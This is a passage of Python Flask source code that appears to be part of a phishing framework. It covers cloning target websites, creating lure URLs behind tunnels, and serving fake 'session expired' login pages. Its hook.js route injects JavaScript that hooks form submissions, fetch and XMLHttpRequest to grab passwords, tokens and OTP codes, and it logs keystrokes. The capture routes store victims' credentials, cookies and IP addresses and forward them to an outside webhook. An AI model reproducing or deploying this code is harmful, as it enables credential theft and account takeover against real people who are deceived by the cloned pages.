    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        site = request.form['site']
        sql = "INSERT INTO companies(name,email,phone,address,site) VALUES(?,?,?,?,?)"
        info = (name, email, phone, address, site)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/companies')

# rota para gerenciamento de usuarios
@app.route("/sfusers/", methods=['GET'])
@flask_login.login_required
def getSfUsers():
    return render_template('admin/sfusers.html')

#================================================================================================================================
# RECORDER & TEMPLATES ROUTES (v3.0+)

# Recorder - Start/Stop recording session
@app.route("/recorder/start", methods=['POST'])
@flask_login.login_required
def recorder_start():
    """Start a new recording session"""
    data = request.json or request.form
    target_url = data.get('url')
    headless = data.get('headless', 'true').lower() == 'true'
    stealth = data.get('stealth', 'true').lower() == 'true'
    
    if not target_url:
        return jsonify({'status': 'error', 'message': 'URL required'}), 400
    
    try:
        recorder = PlaywrightRecorder(DATABASE, headless=headless, stealth=stealth)
        # Store recorder session in g for tracking
        g.recorder = recorder
        
        return jsonify({
            'status': 'ok',
            'message': 'Recording started',
            'recorder_id': id(recorder)
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Recorder - Save template
@app.route("/recorder/save-template", methods=['POST'])
@flask_login.login_required
@csrf_protect.exempt
def save_template():
    """Save recording as a reusable template"""
    data = request.json or request.form
    template_name = data.get('name')
    base_url = data.get('base_url')
    description = data.get('description', '')
    tags = data.get('tags', '')
    clone_mode = data.get('clone_mode', 'both')
    browser_engine = data.get('browser_engine', 'playwright')
    headless = 1 if data.get('headless') else 0
    stealth = 1 if data.get('stealth') else 0
    
    if not template_name or not base_url:
        return jsonify({'status': 'error', 'message': 'Template name and URL required'}), 400
    
    try:
        # Ensure template name is unique; auto-append suffix if duplicate
        cur = g.db
        unique_name = template_name
        i = 1
        while cur.execute("SELECT id FROM templates WHERE name = ?", (unique_name,)).fetchone():
            unique_name = f"{template_name} ({i})"
            i += 1

        cursor = g.db.execute("""
            INSERT INTO templates(name, base_url, description, tags, clone_mode, browser_engine, headless, stealth, created_by)
            VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            unique_name,
            base_url,
            description,
            tags,
            clone_mode,
            browser_engine,
            headless,
            stealth,
            flask_login.current_user.id
        ))
        g.db.commit()
        template_id = cursor.lastrowid
        
        logger.info(f"[+] Template saved: {template_name} (ID: {template_id})")
        
        return jsonify({
            'status': 'ok',
            'template_id': template_id,
            'message': f'Template saved: {unique_name}',
            'template_name': unique_name
        })
    except Exception as e:
        logger.error(f"[-] Error saving template: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Templates - List all templates
@app.route("/templates", methods=['GET'])
@flask_login.login_required
def list_templates():
    """List all saved templates"""
    cur = g.db
    templates = cur.execute("SELECT id, name, base_url, description, tags, clone_mode, created_at FROM templates ORDER BY created_at DESC").fetchall()
    
    template_list = []
    for t in templates:
        template_list.append({
            'id': t[0],
            'name': t[1],
            'base_url': t[2],
            'description': t[3],
            'tags': t[4],
            'clone_mode': t[5],
            'created_at': t[6]
        })
    
    if request.headers.get('Accept') == 'application/json':
        return jsonify(template_list)
    
    return render_template('admin/templates.html', templates=template_list)

# Templates - Load template details
@app.route("/templates/<int:template_id>", methods=['GET'])
@flask_login.login_required
def get_template(template_id):
    """Get template details"""
    cur = g.db
    template = cur.execute("SELECT * FROM templates WHERE id = ?", (template_id,)).fetchone()
    
    if not template:
        return jsonify({'status': 'error', 'message': 'Template not found'}), 404
    
    return jsonify({
        'id': template[0],
        'name': template[1],
        'base_url': template[2],
        'description': template[3]
    })

# MITM & Tunneling - Configure tunnel for template
@app.route("/tunnel/setup", methods=['POST'])
@flask_login.login_required
def tunnel_setup():
    """Setup tunnel (ngrok/cloudflared) for a template"""
    data = request.json or request.form
    template_id = data.get('template_id')
    tunnel_type = data.get('tunnel_type', 'ngrok')  # ngrok or cloudflared
    tunnel_token = data.get('tunnel_token')
    
    if tunnel_type == 'ngrok' and tunnel_token:
        tunnel_url = tunnel_manager.start_ngrok_tunnel(
            local_port=5000,
            session_name=f"template_{template_id}"
        )
    elif tunnel_type == 'cloudflared':
        tunnel_url = tunnel_manager.start_cloudflared_tunnel(
            local_port=5000,
            session_name=f"template_{template_id}"
        )
    else:
        return jsonify({'status': 'error', 'message': 'Invalid tunnel type'}), 400
    
    if tunnel_url:
        # Store tunnel config in DB
        cur = g.db
        cur.execute("""
            INSERT OR REPLACE INTO mitm_config(template_id, tunnel_type, tunnel_token, tunnel_domain)
            VALUES(?, ?, ?, ?)
        """, (template_id, tunnel_type, tunnel_token, tunnel_url))
        g.db.commit()
        
        return jsonify({
            'status': 'ok',
            'tunnel_url': tunnel_url,
            'message': f'{tunnel_type} tunnel started'
        })
    
    return jsonify({'status': 'error', 'message': 'Failed to start tunnel'}), 500

# Save Template - Comprehensive template saving from Recording Studio
@app.route("/template/save", methods=['POST'])
@flask_login.login_required
@csrf_protect.exempt
def save_template_comprehensive():
    """Save a comprehensive template with all metadata from Recording Studio"""
    data = request.json or request.form
    template_name = data.get('name')
    base_url = data.get('base_url')
    
    if not template_name or not base_url:
        return jsonify({'status': 'error', 'message': 'Template name and URL required'}), 400
    
    try:
        cur = g.db
        
        # Check if template already exists
        existing = cur.execute("SELECT id FROM templates WHERE name = ?", (template_name,)).fetchone()
        if existing:
            return jsonify({'status': 'error', 'message': f'Template "{template_name}" already exists'}), 409
        
        clone_id = data.get('clone_id', '')
        cur.execute("""
            INSERT INTO templates(name, base_url, description, tags, clone_mode, browser_engine, headless, stealth, created_by, clone_id)
            VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            template_name,
            base_url,
            data.get('description', ''),
            data.get('tags', ''),
            data.get('clone_mode', 'both'),
            data.get('browser_engine', 'playwright'),
            1 if data.get('headless') else 0,
            1 if data.get('stealth') else 0,
            flask_login.current_user.id,
            clone_id
        ))
        g.db.commit()
        template_id = cur.execute("SELECT last_insert_rowid()").fetchone()[0]
        
        # If session_id provided, link it to template
        session_id = data.get('session_id')
        if session_id:
            try:
                cur.execute("""
                    UPDATE sessions SET template_id = ?, linked_template_name = ? WHERE session_id = ?
                """, (template_id, template_name, session_id))
                g.db.commit()
            except:
                pass  # Session linking optional
        
        logger.info(f"[+] Template saved: {template_name} (ID: {template_id}) by {flask_login.current_user.id}")
        
        return jsonify({
            'status': 'ok',
            'template_id': template_id,
            'message': f'Template "{template_name}" saved successfully!'
        })
    except Exception as e:
        logger.error(f"[-] Error saving template: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Lure URL - Generate phishing link with template ID
@app.route("/lure/generate/<int:template_id>", methods=['POST'])
@csrf_protect.exempt
@flask_login.login_required
def generate_lure_from_template(template_id):
    """Generate a lure URL for a specific template"""
    try:
        cur = g.db
        
        # Verify template exists
        template = cur.execute("SELECT base_url FROM templates WHERE id = ?", (template_id,)).fetchone()
        if not template:
            return jsonify({'status': 'error', 'message': 'Template not found'}), 404
        
        # Check request for 'use_simple' flag (short readable path)
        try:
            req_data = request.get_json(silent=True) or {}
        except Exception:
            req_data = {}
        use_simple = False
        if isinstance(req_data, dict):
            use_simple = bool(req_data.get('use_simple') or req_data.get('simple_path'))

        # Generate lure hash or short slug depending on flag
        if use_simple:
            import random
            candidates = ['signin','login','account','secure','verify','update','auth','access','signin1','login1']
            base = random.choice(candidates)
            slug = base
            i = 1
            # Ensure slug uniqueness in lure_urls.lure_hash
            while cur.execute("SELECT 1 FROM lure_urls WHERE lure_hash = ?", (slug,)).fetchone():
                slug = f"{base}{i}"
                i += 1
            lure_hash = slug
        else:
            lure_hash = hashlib.sha256(f"{template_id}{date.today()}{os.urandom(8).hex()}".encode()).hexdigest()[:16]
        
        # Get tunnel URL for this template
        tunnel_config = cur.execute("SELECT tunnel_domain FROM mitm_config WHERE template_id = ?", (template_id,)).fetchone()
        
        if tunnel_config and tunnel_config[0]:
            lure_url = f"{tunnel_config[0]}/capture/{lure_hash}"
        else:
            # Fallback to localhost if no tunnel configured
            lure_url = f"http://localhost:5000/capture/{lure_hash}"
        
        # Store lure URL in DB
        cur.execute("""
            INSERT INTO lure_urls(template_id, lure_hash, full_url, created_at)
            VALUES(?, ?, ?, datetime('now'))
        """, (template_id, lure_hash, lure_url))
        g.db.commit()
        
        import logging
        logging.info(f"[+] Lure URL generated for template {template_id}: {lure_url}")
        
        # Generate 3 URLs: lure, localhost:5000, and webhook
        localhost_url = f"http://localhost:5000/capture/{lure_hash}"
        webhook_url = f"http://localhost:5000/hook.js"
        
        return jsonify({
            'status': 'ok',
            'lure_url': lure_url,
            'lure_hash': lure_hash,
            'template_id': template_id,
            'urls': {
                'lure': lure_url,
                'localhost': localhost_url,
                'webhook': webhook_url
            }
        })
    except Exception as e:
        import logging
        logging.error(f"[-] Error generating lure: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Webhook Hook.js endpoint - Injects monitoring code
@app.route("/hook.js", methods=['GET'])
@csrf_protect.exempt
def webhook_hook():
    """
    Webhook hook.js - Returns monitoring/injection code
    Uses RELATIVE paths so it works from any domain/tunnel URL
    """
    redirect_url = _get_config_redirect()
    hook_js = f'''(function(){{
    var HOOK_VERSION = '3.1';
    var REDIRECT_URL = {json.dumps(redirect_url)};
    var BASE_URL = (function(){{
        var scripts = document.getElementsByTagName('script');
        for(var i = 0; i < scripts.length; i++){{
            if(scripts[i].src && scripts[i].src.indexOf('hook.js') !== -1){{
                return scripts[i].src.replace('/hook.js', '');
            }}
        }}
        return window.location.origin;
    }})();
    var captured = false;

    function hasCredentials(data){{
        if(!data) return false;
        var keys = Object.keys(data).join(' ').toLowerCase();
        var vals = Object.values(data).join(' ').toLowerCase();
        return /pass|pwd|secret|token|otp|pin|email|user|login|auth/.test(keys) ||
               (vals.length > 3 && /password|passwd/.test(keys));
    }}

    function sendCredentials(data, shouldRedirect){{
        if(!data || !hasCredentials(data)) return Promise.resolve();
        var webhookUrl = BASE_URL + '/api/credential-webhook';
        var params = new URLSearchParams();
        for(var key in data){{
            if(Object.prototype.hasOwnProperty.call(data, key)){{
                params.append(key, data[key]);
            }}
        }}
        return fetch(webhookUrl, {{
            method: 'POST',
            headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
            body: params,
            credentials: 'include'
        }}).then(function(r){{
            return r.json().catch(function(){{ return {{}}; }});
        }}).then(function(resp){{
            var target = (resp && resp.redirect_url) ? resp.redirect_url : REDIRECT_URL;
            if(shouldRedirect && target && !captured){{
                captured = true;
                setTimeout(function(){{ window.location.href = target; }}, 400);
            }}
        }}).catch(function(err){{
            console.log('[SF] Webhook error: ' + err);
        }});
    }}

    function parseBody(body){{
        if(!body) return {{}};
        if(typeof body === 'string'){{
            try {{ return JSON.parse(body); }} catch(e) {{}}
            var out = {{}};
            body.split('&').forEach(function(part){{
                var kv = part.split('=');
                if(kv[0]) out[decodeURIComponent(kv[0])] = decodeURIComponent(kv[1] || '');
            }});
            return out;
        }}
        if(body instanceof FormData){{
            var fd = {{}};
            body.forEach(function(v, k){{ fd[k] = v; }});
            return fd;
        }}
        if(typeof body === 'object') return body;
        return {{}};
    }}

    document.addEventListener('submit', function(e){{
        try {{
            if(!e.target || e.target.tagName !== 'FORM') return;
            var form = e.target;
            var formData = new FormData(form);
            var data = {{}};
            formData.forEach(function(v, k){{ data[k] = v; }});
            if(!hasCredentials(data)) return;
            e.preventDefault();
            e.stopPropagation();
            sendCredentials(data, true);
        }} catch(err) {{
            console.log('[SF] Form capture error: ' + err);
        }}
    }}, true);

    var origFetch = window.fetch;
    if(origFetch){{
        window.fetch = function(input, init){{
            init = init || {{}};
            if((init.method || 'GET').toUpperCase() === 'POST'){{
                var data = parseBody(init.body);
                if(hasCredentials(data)){{
                    sendCredentials(data, true);
                }}
            }}
            return origFetch.apply(this, arguments);
        }};
    }}

    var origOpen = XMLHttpRequest.prototype.open;
    var origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url){{
        this._sfMethod = method;
        this._sfUrl = url;
        return origOpen.apply(this, arguments);
    }};
    XMLHttpRequest.prototype.send = function(body){{
        try {{
            if((this._sfMethod || '').toUpperCase() === 'POST'){{
                var data = parseBody(body);
                if(hasCredentials(data)){{
                    sendCredentials(data, true);
                }}
            }}
        }} catch(err) {{}}
        return origSend.apply(this, arguments);
    }};
    
    // Keystroke logging with buffering
    var keystrokeBuffer = '';
    var lastKeySendTime = Date.now();
    var KEYSTROKE_TIMEOUT = 5000; // Send keys every 5 seconds
    var KEYSTROKE_BUFFER_SIZE = 100; // Or after 100 chars
    
    function sendKeystrokes(){{
        if(keystrokeBuffer.length === 0) return;
        var keylogUrl = BASE_URL + '/api/keys-webhook';
        fetch(keylogUrl, {{
            method: 'POST',
            body: JSON.stringify({{
                keys: keystrokeBuffer,
                page: window.location.href,
                timestamp: new Date().toISOString()
            }}),
            headers: {{'Content-Type': 'application/json'}},
            credentials: 'include'
        }}).catch(function(){{}});
        keystrokeBuffer = '';
        lastKeySendTime = Date.now();
    }}

    document.addEventListener('keypress', function(e){{
        try {{
            if(e.key && e.key.length === 1){{
                keystrokeBuffer += e.key;
            }} else if(e.key === 'Enter'){{
                keystrokeBuffer += '\\n';
            }} else if(e.key === 'Backspace'){{
                keystrokeBuffer = keystrokeBuffer.slice(0, -1);
            }}
            if(keystrokeBuffer.length >= KEYSTROKE_BUFFER_SIZE){{
                sendKeystrokes();
            }}
        }} catch(err) {{}}
    }}, true);

    setInterval(function(){{
        if(Date.now() - lastKeySendTime > KEYSTROKE_TIMEOUT){{
            sendKeystrokes();
        }}
    }}, KEYSTROKE_TIMEOUT);

    document.addEventListener('visibilitychange', function(){{
        if(document.hidden) sendKeystrokes();
    }});

    window.addEventListener('beforeunload', function(){{
        if(keystrokeBuffer.length > 0) sendKeystrokes();
    }});
}})();'''
    return hook_js, 200, {'Content-Type': 'application/javascript'}

# Victim Capture Page - Generic phishing form
@app.route("/capture/<lure_hash>", methods=['GET', 'POST'])
@csrf_protect.exempt  # Capture endpoints must be exempt - victims won't have CSRF tokens
def victim_capture(lure_hash):
    """Generic victim capture page - responds with cloned page or form"""
    cur = g.db

    # If the path is the special 'form' endpoint, delegate to the dedicated handler
    if lure_hash == 'form':
        return capture_form()
    
    # Find lure record by hash (includes target URL)
    lure_record = cur.execute("SELECT template_id, full_url, target_url FROM lure_urls WHERE lure_hash = ?", (lure_hash,)).fetchone()
    
    if not lure_record:
        # Invalid lure hash - return 404
        return '''<!DOCTYPE html>
        <html><head><title>Not Found</title></head>
        <body><h1>404</h1><p>Page not found</p></body></html>''', 404
    
    template_id, full_url, target_url = lure_record[0], lure_record[1], lure_record[2]
    
    # Get victim info upfront (needed for both GET and POST)
    victim_ip = request.remote_addr
    victim_ua = request.headers.get('User-Agent', 'Unknown')

    # If the path is the special 'form' endpoint, delegate to the dedicated handler
    if lure_hash == 'form':
        return capture_form()
    
    # Log click
    cur.execute("""
        UPDATE lure_urls SET click_count = click_count + 1, 
        first_click = CASE WHEN first_click IS NULL THEN datetime('now') ELSE first_click END,
        last_click = datetime('now')
        WHERE lure_hash = ?
    """, (lure_hash,))
    g.db.commit()
    
    if request.method == 'POST':
        # Capture victim data
        form_data = request.form.to_dict()
        
        # Extract credential fields (pass request for cookie capture)
        extracted = extract_credential_fields(form_data, request)
        
        # Create session record with unique session_hash to avoid UNIQUE constraint
        session_hash = hashlib.sha256(f"{lure_hash}{victim_ip}{datetime.now().isoformat()}{os.urandom(6).hex()}".encode()).hexdigest()[:16]
        
        cur.execute("""
            INSERT INTO sessions(template_id, session_hash, victim_ip, victim_ua, form_data, submitted_credentials)
            VALUES(?, ?, ?, ?, ?, ?)
        """, (
            template_id,
            session_hash,
            victim_ip,
            victim_ua,
            json.dumps(form_data),
            json.dumps(extracted)
        ))
        g.db.commit()
        session_id = cur.execute("SELECT last_insert_rowid()").fetchone()[0]
        
        # Also store in creds table for main credential panel
        sql = """INSERT INTO creds(url, jdoc, pdate, browser, bversion, platform, rip, 
                                   email, username, password, cookies, csrf_tokens,
                                   form_fields, captured_metadata) 
                 VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""
        url = target_url if target_url else full_url
        d = "{:%m-%d-%Y}".format(date.today())
        creds = (url, json.dumps(form_data), d,
                 str(request.user_agent.browser) if request.user_agent else 'Unknown',
                 str(request.user_agent.version) if request.user_agent else 'Unknown',
                 str(request.user_agent.platform) if request.user_agent else 'Unknown',
                 victim_ip,
                 extracted['email'], extracted['username'], extracted['password'],
                 extracted['cookies'], extracted['csrf_tokens'],
                 json.dumps(extracted['form_fields']),
                 json.dumps({'browser': request.user_agent.browser if request.user_agent else 'Unknown',
                           'platform': request.user_agent.platform if request.user_agent else 'Unknown'}))
        cur.execute(sql, creds)
        g.db.commit()
        last_id = cur.execute("SELECT last_insert_rowid()").fetchone()[0]
        
        # Trigger webhook if configured (v3.0+ feature)
        try:
            webhook = cur.execute("SELECT url FROM sfwebhook WHERE id = 1").fetchone()
            if webhook and webhook[0]:
                webhook_url = webhook[0]
                webhook_payload = {
                    'event': 'credential_captured',
                    'credential_id': last_id,
                    'url': url,
                    'victim_ip': victim_ip,
                    'victim_ua': victim_ua,
                    'browser': str(request.user_agent.browser) if request.user_agent else 'Unknown',
                    'timestamp': datetime.now().isoformat(),
                    'form_data': form_data,
                    'extracted_fields': {
                        'email': extracted['email'],
                        'username': extracted['username'],
                        'has_password': bool(extracted['password']),
                        'has_cookies': bool(extracted['cookies']),
                        'csrf_tokens_count': len(extracted['csrf_tokens']),
                        'mfa_fields': [f for f in extracted['form_fields'].get('detected_fields', []) 
                                     if any(t in f.lower() for t in ['otp', '2fa', 'mfa', 'code', 'auth'])
                        ]
                    }
                }
                
                # Send webhook asynchronously
                try:
                    requests.post(webhook_url, json=webhook_payload, timeout=5)
                    logger.info(f"[WEBHOOK] Sent credential notification to {webhook_url}")
                except Exception as we:
                    logger.warning(f"[WEBHOOK] Failed to send: {we}")
        except Exception as e:
            logger.debug(f"[WEBHOOK] Webhook check error: {e}")
        
        # Emit WebSocket event for live panel update
        try:
            socketio.emit('credentials_captured', {
                'id': last_id,
                'url': url,
                'ip': victim_ip,
                'browser': request.user_agent.browser if request.user_agent else 'Unknown',
                'bversion': request.user_agent.version if request.user_agent else 'Unknown',
                'platform': request.user_agent.platform if request.user_agent else 'Unknown',
                'date': d,
                'email': extracted['email'],
                'username': extracted['username']
            }, skip_sid=request.sid, broadcast=True, namespace='/')
            logger.info(f"[CAPTURE] Credentials captured from {victim_ip} via lure {lure_hash}")
        except Exception as e:
            logger.debug(f"[CAPTURE] Socket error (non-critical): {str(e)[:100]}")
        
        # Get redirect URL from config
        config = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
        redirect_url = config[0] if config else 'http://localhost:5000'
        
        return redirect(redirect_url)
    
    # GET request - return cloned page or generic form
    # Check config to see if we should clone AND get configured clone URL
    config_result = cur.execute("SELECT status, url FROM config LIMIT 1").fetchone()
    config_status = config_result[0] if config_result else 'form'
    config_clone_url = config_result[1] if config_result and config_result[1] else None
    
    # Use configured URL for cloning, fall back to target_url
    clone_url = config_clone_url if config_clone_url else target_url
    
    if config_status == 'clone' and clone_url and not clone_url.startswith('http://127.0.0.1') and not clone_url.startswith('http://localhost'):
        # Try to clone the website if configured for cloning and NOT localhost (prevent recursion)
        try:
            logger.info(f"[CLONE] Attempting to clone website for lure {lure_hash}: {clone_url}")
            # Clone the website with hook injection
            clone_success = clone(clone_url, victim_ua, beef='yes')
            
            if clone_success:
                # Read cloned HTML from disk - clone() saves to templates/fake/{agent_hash}/{url_hash}/index.html
                agent_hash = hashlib.md5(victim_ua.encode()).hexdigest()[:8]
                url_hash = hashlib.md5(clone_url.encode()).hexdigest()[:8]
                clone_file_path = f'templates/fake/{agent_hash}/{url_hash}/index.html'
                
                try:
                    with open(clone_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        cloned_html = f.read()
                    
                    # Inject capture form action into cloned HTML
                    cloned_html = cloned_html.replace(
                        'action=""',
                        f'action="/capture/{lure_hash}"'
                    ).replace(
                        'action="/"',
                        f'action="/capture/{lure_hash}"'
                    ).replace(
                        "action=''",
                        f"action='/capture/{lure_hash}'"
                    )
                    logger.info(f"[CLONE] Successfully cloned and injected for lure {lure_hash}")
                    return cloned_html
                except FileNotFoundError:
                    logger.warning(f"[CLONE] Cloned file not found at {clone_file_path}, using default form")
        except Exception as clone_error:
            logger.warning(f"[CLONE] Failed to clone {target_url}: {str(clone_error)[:100]}")
        
        # Fallback to basic form if cloning fails
        logger.info(f"[CLONE] Clone failed or not available for lure {lure_hash}, using default form")
        return f'''<!DOCTYPE html>
        <html><head><title>Login</title></head>
        <body>
        <form method="POST" action="/capture/{lure_hash}">
        <h3>Please log in again</h3>
        <input type="text" name="email" placeholder="Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
        </form>
        </body></html>'''
    else:
        # Return generic form (for localhost or when not configured for cloning)
        return f'''<!DOCTYPE html>
        <html><head><title>Login Required</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
        <div style="max-width: 400px; margin: 0 auto; border: 1px solid #ddd; padding: 30px; border-radius: 5px;">
        <h2>Login Required</h2>
        <p>Your session has expired. Please log in again.</p>
        <form method="POST" action="/capture/{lure_hash}">
        <input type="text" name="email" placeholder="Email or Username" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 3px;">
        <input type="password" name="password" placeholder="Password" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 3px;">
        <button type="submit" style="width: 100%; padding: 10px; margin: 10px 0; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;">Login</button>
        </form>
        </div>
        </body></html>'''

# Generic Form Capture - CSRF Exempt for cloned page form submissions
@app.route("/capture/form", methods=['GET', 'POST'])
@csrf_protect.exempt
def capture_form():
    """
    Capture form submissions from cloned pages.
    This endpoint receives form data from phishing clone pages.
    """
    cur = g.db
    
    # Get victim info
    victim_ip = request.remote_addr
    victim_ua = request.headers.get('User-Agent', 'Unknown')

    # Support both traditional form POSTs and JSON payloads injected by clone hooks
    form_data = {}
    # Lightweight request logging for debugging form capture (appends to scripts/capture_calls.log)
    try:
        with open('scripts/capture_calls.log', 'a', encoding='utf-8') as lf:
            lf.write(f"[{datetime.now().isoformat()}] METHOD={request.method} IS_JSON={request.is_json}\n")
    except Exception:
        pass
    if request.method == 'POST':
        if request.is_json:
            payload = request.get_json(silent=True) or {}
            # Hook scripts commonly send { form_data: {...}, page_url: '...', clone_id: '...' }
            if isinstance(payload, dict) and 'form_data' in payload and isinstance(payload['form_data'], dict):
                form_data = payload['form_data']
            else:
                # If payload itself is a mapping of form fields, use it directly
                form_data = payload if isinstance(payload, dict) else {}
            # If form_data was JSON-stringified inside payload, attempt to parse
            if isinstance(form_data, str):
                try:
                    form_data = json.loads(form_data)
                except Exception:
                    form_data = {}
        else:
            form_data = request.form.to_dict()
    
    # Get configured redirect URL from config table
    config = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
    redirect_url = config[0] if config else 'http://localhost:5000'
    
    if request.method == 'POST' and form_data:
        # Create session record for captured credentials (use time+randomness to avoid collisions)
        session_hash = hashlib.sha256(f"{victim_ip}{datetime.now().isoformat()}{os.urandom(6).hex()}".encode()).hexdigest()[:16]
        try:
            cur.execute("""
                INSERT INTO sessions(template_id, session_hash, victim_ip, victim_ua, submitted_credentials)
                VALUES(?, ?, ?, ?, ?)
            """, (
                1,  # Default template
                session_hash,
                victim_ip,
                victim_ua,
                json.dumps(form_data)
            ))
            g.db.commit()
            session_id = cur.execute("SELECT last_insert_rowid()").fetchone()[0]
            extracted = extract_credential_fields(form_data, request)
            save_victim_session(cur, form_data=form_data, extracted=extracted)

            # Log credential capture
            logger.info(f"[CAPTURE] Credentials captured from {victim_ip} - Fields: {list(form_data.keys())}")

            # Emit live notification to all connected clients
            socketio.emit('credentials_captured', {
                'victim_ip': victim_ip,
                'session_id': session_id,
                'fields': list(form_data.keys()),
                'timestamp': datetime.now().isoformat()
            }, namespace='/')

        except Exception as e:
            logger.error(f"[CAPTURE] Error saving credentials: {str(e)}")
        
        # Redirect to configured URL (or localhost:5000 if not set)
        return redirect(redirect_url)
    
    # GET request - redirect to localhost
    return redirect('http://localhost:5000')

# ============ MODERN CLONE SERVING ROUTES ============

CLONE_STORAGE_DIR = Path('templates/clones')

def _url_match_key(url):
    """Normalize URL host/path for fuzzy clone matching (http/https, with/without www)."""
    from urllib.parse import urlparse
    parsed = urlparse(url if '://' in url else f'https://{url}')
    host = parsed.netloc.lower()
    if host.startswith('www.'):
        host = host[4:]
    path = parsed.path.rstrip('/') or '/'
    return host, path

def _canonicalize_clone_url(url):
    """Prefer https and www-prefixed host for cloning requests."""
    from urllib.parse import urlparse, urlunparse
    parsed = urlparse(url if '://' in url else f'https://{url}')
    host = parsed.netloc.lower()
    if host and not host.startswith('www.') and host.count('.') >= 1:
        host = f'www.{host}'
    scheme = 'https' if parsed.scheme in ('http', 'https', '') else parsed.scheme
    path = parsed.path or '/'
    return urlunparse((scheme, host, path, '', '', ''))

def _clone_url_variants(url):
    """Generate URL variants to match or clone the same site."""
    from urllib.parse import urlparse, urlunparse
    base = url if '://' in url else f'https://{url}'
    parsed = urlparse(base)
    host = parsed.netloc.lower()
    path = parsed.path or '/'
    variants = [base, _canonicalize_clone_url(base)]
    if host.startswith('www.'):
        bare = host[4:]
        variants.append(urlunparse((parsed.scheme or 'https', bare, path, '', '', '')))
    variants.append(urlunparse(('https', host, path, '', '', '')))
    seen = set()
    ordered = []
    for item in variants:
        if item not in seen:
            seen.add(item)
            ordered.append(item)
    return ordered

def _find_clone_id_for_url(url):
    """Find a filesystem clone matching a target URL (tolerates http/https and www differences)."""
    if not url:
        return None
    target_key = _url_match_key(url)

    if CLONE_STORAGE_DIR.is_dir():
        for clone_dir in CLONE_STORAGE_DIR.iterdir():
            if not clone_dir.is_dir():
                continue
            meta_path = clone_dir / 'metadata.json'
            if meta_path.is_file():
                try:
                    with open(meta_path, 'r', encoding='utf-8') as f:
                        original = json.load(f).get('original_url', '')
                    if _url_match_key(original) == target_key:
                        return clone_dir.name
                except Exception:
                    pass
            for variant in _clone_url_variants(url):
                if (clone_dir / 'index.html').is_file() and clone_dir.name == RealCloner()._generate_clone_id(variant):
                    return clone_dir.name
    return None

def _resolve_clone_asset_path(clone_base, subpath):
    """Resolve a clone asset path, including hashed filename fallbacks."""
    from urllib.parse import unquote
    subpath = unquote(subpath).replace('\\', '/').lstrip('/')
    clone_base = clone_base.resolve()

    candidates = [subpath]
    if subpath.startswith('font/'):
        candidates.append('fonts/' + subpath[5:])
    elif subpath.startswith('fonts/'):
        candidates.append('font/' + subpath[6:])

    for candidate in candidates:
        direct = (clone_base / candidate).resolve()
        if str(direct).startswith(str(clone_base)) and direct.is_file():
            return direct, candidate

        rel = Path(candidate)
        parent = clone_base / rel.parent
        stem, suffix = rel.stem, rel.suffix
        if parent.is_dir() and stem and suffix:
            matches = sorted(parent.glob(f"{stem}_*{suffix}"))
            if matches:
                chosen = matches[0]
                rel_path = str(chosen.relative_to(clone_base)).replace('\\', '/')
                return chosen.resolve(), rel_path
    return None, None

def _get_clone_asset_aliases(clone_id):
    """Map original asset filenames to local hashed filenames."""
    aliases = {}
    metadata = _load_clone_metadata(clone_id)
    from urllib.parse import urlparse
    for asset_type in ('js', 'css', 'images', 'fonts'):
        for item in metadata.get('assets_info', {}).get(asset_type, []):
            orig_name = Path(urlparse(item.get('original_url', '')).path).name
            local_name = Path(item.get('local_url', '')).name
            if orig_name and local_name and orig_name != local_name:
                aliases[orig_name] = local_name

    clone_base = CLONE_STORAGE_DIR / clone_id
    for folder in ('js', 'css', 'images', 'fonts', 'font'):
        folder_path = clone_base / folder
        if not folder_path.is_dir():
            continue
        for asset_file in folder_path.iterdir():
            if not asset_file.is_file():
                continue
            if '_' not in asset_file.stem:
                continue
            base_stem = asset_file.stem.rsplit('_', 1)[0]
            plain_name = f"{base_stem}{asset_file.suffix}"
            aliases.setdefault(plain_name, asset_file.name)
    return aliases

def _rewrite_clone_asset_refs(content, aliases, clone_id):
    """Rewrite relative imports in JS/CSS to hashed local filenames."""
    if not aliases or not content:
        return content
    for plain, hashed in aliases.items():
        if plain == hashed:
            continue
        replacements = [
            f'./{plain}', f'../{plain}', f'/{plain}',
            f'/clone/{clone_id}/js/{plain}',
            f'/clone/{clone_id}/css/{plain}',
            f'/clone/{clone_id}/images/{plain}',
        ]
        hashed_replacements = [
            f'./{hashed}', f'../{hashed}', f'/{hashed}',
            f'/clone/{clone_id}/js/{hashed}',
            f'/clone/{clone_id}/css/{hashed}',
            f'/clone/{clone_id}/images/{hashed}',
        ]
        for old, new in zip(replacements, hashed_replacements):
            content = content.replace(old, new)
    return content

def _safe_clone_path(clone_id, subpath=''):
    """Resolve clone file path and block directory traversal."""
    if not clone_id or '..' in clone_id or '/' in clone_id or '\\' in clone_id:
        return None
    clone_base = (CLONE_STORAGE_DIR / clone_id).resolve()
    storage_root = CLONE_STORAGE_DIR.resolve()
    if not str(clone_base).startswith(str(storage_root)) or not clone_base.is_dir():
        return None
    if subpath:
        asset_path, _ = _resolve_clone_asset_path(clone_base, subpath)
        return asset_path
    index_path = clone_base / 'index.html'
    return index_path if index_path.is_file() else None

def _serve_clone_asset(clone_id, clone_base, subpath):
    """Serve a clone static asset with hashed-name fallback and import rewriting."""
    asset_path, rel_path = _resolve_clone_asset_path(clone_base, subpath)
    if not asset_path:
        return None

    text_types = {'.js', '.mjs', '.css'}
